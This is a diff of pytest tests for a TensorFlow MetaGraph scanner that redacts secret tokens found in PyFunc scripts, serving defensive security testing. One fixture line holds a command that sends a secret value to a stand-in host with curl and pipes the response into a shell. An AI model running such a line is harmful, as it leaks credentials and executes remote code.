@@ -627,7 +627,7 @@ def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path
             ],
             collection_bytes={
                 "runtime_hook_client_secret": [
-                    f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode("utf-8")
+                    f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode()
                 ]
             },
         )
@@ -644,6 +644,73 @@ def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path
     assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
     assert attr_secret not in serialized_result
     assert collection_secret not in serialized_result
+
+
+@pytest.mark.parametrize(
+    "secret",
+    [
+        "gho_" + ("a" * 36),
+        "ghu_" + ("a" * 36),
+        "ghr_" + ("a" * 36),
+        "sk-proj-" + ("a" * 32),
+        "npm_" + ("a" * 36),
+        "xoxb-" + ("a" * 24),
+        "gho%5F" + ("a" * 36),
+        "gho%255F" + ("a" * 36),
+    ],
+)
+def test_tf_metagraph_scanner_redacts_standalone_secret_tokens(tmp_path: Path, secret: str) -> None:
+    malicious_meta = tmp_path / "standalone-secret.meta"
+    malicious_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {"script": f"python -c 'print(1)' {secret}"},
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
+    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
+
+    assert secret not in result.to_json()
+    assert REDACTED_EVIDENCE_VALUE in executable_check.details["value_preview"]
+
+
+@pytest.mark.parametrize(
+    "near_match",
+    [
+        "gho_" + ("a" * 35),
+        "prefixgho_" + ("a" * 36),
+        "sk-" + ("a" * 23),
+        "sk-proj-example",
+        "npm_" + ("a" * 35),
+        "xoxb-" + ("a" * 19),
+        "gho%5F" + ("a" * 35),
+    ],
+)
+def test_tf_metagraph_scanner_preserves_standalone_secret_near_matches(tmp_path: Path, near_match: str) -> None:
+    public_context = f"python -c 'print(1)' {near_match}"
+    public_meta = tmp_path / "standalone-secret-near-match.meta"
+    public_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {"script": public_context},
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
+    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
+
+    assert executable_check.details["value_preview"] == public_context
 
 
 def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
